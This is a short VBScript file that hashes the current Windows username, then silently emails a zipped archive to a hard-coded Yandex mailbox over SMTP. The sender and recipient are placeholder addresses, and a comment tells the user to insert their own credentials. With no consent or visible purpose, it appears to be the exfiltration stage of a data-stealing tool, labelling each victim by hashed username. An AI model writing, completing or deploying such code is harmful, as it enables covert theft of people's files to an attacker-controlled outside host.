function SHA1(str)
    set sha1         = CreateObject("System.Security.Cryptography.SHA1Managed"):
	Set UTF8Encoding = CreateObject("System.Text.UTF8Encoding"):
	
    sha1.Initialize():
    strBytes = UTF8Encoding.GetBytes_4(str)
    getHash  = sha1.ComputeHash_2((strBytes)):

    for x = 1 to lenb(getHash)
        strHex = hex(ascb(midb((getHash), x, 1))):
        if len(strHex) = 1 then strHex = "0" & strHex:
        bytesToHex     = bytesToHex & strHex:
    next
	
	SHA1 = Mid(bytesToHex, 1, 12):
end function


Set ws = CreateObject("WScript.Shell"):
Set e  = CreateObject("CDO.Message"):
Set fs = CreateObject("Scripting.FileSystemObject"):

username   = ws.ExpandEnvironmentStrings("%username%"):

e.Subject  = SHA1(username):
e.From     = "<example@yandex.com>":
e.To       = "<example@yandex.com>":
e.TextBody = "":
e.AddAttachment THE_PATH_TO_THE_ZIPPED_ARCHIVE:

' You need to edit this parameters to can use your email
e.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusing")        = 2:
e.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserver")       = "smtp.yandex.com":
e.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserverport")   = 465:
e.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1:
e.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusername")     = "example@yandex.com":
e.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendpassword")     = "PASSWORD":
e.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpusessl")       = true:

e.Configuration.Fields.Update:
e.Send:
